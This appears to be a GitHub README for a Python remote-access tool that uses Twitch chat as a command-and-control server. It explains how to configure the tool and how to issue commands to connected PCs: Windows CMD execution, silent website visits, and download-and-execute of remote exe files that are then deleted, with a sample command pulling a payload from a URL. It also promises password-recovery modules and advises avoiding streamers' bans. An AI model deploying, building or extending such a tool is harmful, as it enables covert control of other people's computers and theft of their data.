# TwitchCommand [![Open Source Love](https://badges.frapsoft.com/os/v2/open-source.svg?v=103)](https://github.com/ellerbrock/open-source-badges/) [![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg?style=flat-square)](http://makeapullrequest.com) [![GPL Licence](https://badges.frapsoft.com/os/gpl/gpl.svg?v=103)](https://opensource.org/licenses/GPL-3.0/)
A remote administration tool that uses Twitch Chat as a Command and Control server. This program connects clients to a designated Twitch Chat and listens for commands. Inspired by the [Slackor](https://github.com/Coalfire-Research/Slackor) project. Make sure to check it out.

# Requirements
- Twitch account.
- Python 3.x
- PyInstaller (will be required with the next build.)

# Disclaimer
The usage of this program directly violates the Twitch Developer Agreement. The usage of it will lead to the termination of your account and possible further action based on the severity of its usage.

This program was created as a Proof of Concept and it is not intended to be used in a malicious way. I am not responsible for any damages or criminal charges that come from using it.

# Features
`cmd`  Windows CMD commands. Structured as `cmd command`

`de` Download and execute. File is removed after execution. Structured as `de link`. May throw `Win5 Error` if the user is prompted for UAC.

`visit`  Silently visits a website. Structured as `visit link`

### Screen currently does not work. I'm fixing it now.

# Usage
Navigate to the twitch page of the channel you selected when making the program.

Upon connection to a server, a new client will announce its presence and client name. If you would like to view a list of all connected clients please use the list command. 

![New Connection.](https://i.imgur.com/fT6yice.png)

`!list`

![List connections.](https://i.imgur.com/RY81sGt.png)

This program also features different modules which can be used.

`!act client command action true`

- Act is the keyword to use a command for the client.
- Client specifies a singular user or a group. You can use a specific name (ex: DESKTOP-TEST) or 'all'.
- Command specifies the intended module to use.
- Action is what to use with the selected module. For example 'start.' will open the current directory on the clients PC when using CMD.
- True is just a placeholder value as I was too lazy to scrub \r\n off the final value. You can write anything.

An example cmd command would be:

`!act all cmd start. true`

![Client action.](https://i.imgur.com/g7d5P83.png)

This would open the current directory on every connected clients PC.

An example download+execute command would be:

`!act DESKTOP-TEST de https://example.com/files/file.exe true`

It currently only supports exe files.

# Creating the program.
### Coming soon: a builder.
Making the program is quite simple. 
- Change the NICK value on line 10 to your Twitch username.
- Change the PASS value on line 11 to your OAuth password (acquire it here: https://twitchapps.com/tmi/)
- Change the CHAN value on line 12 to a desired channel to listen in. It's recommended to use your personal twitch chat as a streamer may ban an account they see posting odd messages and commands.
- Change CLIENT_ID value on line 20 to an Imgur api client id. This is only necessary if you want to use the `screen` command. THis command is currently not in the program as it was added too early and is not ready. It will be coming soon.

# Upcoming features
- More modules (password recovery and screenshot coming soon.)
- Download & execute supporting all file types.
- Removing the requirement for 'true' in commands (proper scrubbing.)
- A builder to simplify making the program as well as making it an exe.
- Command line based control module as an alternative to the twitch website.
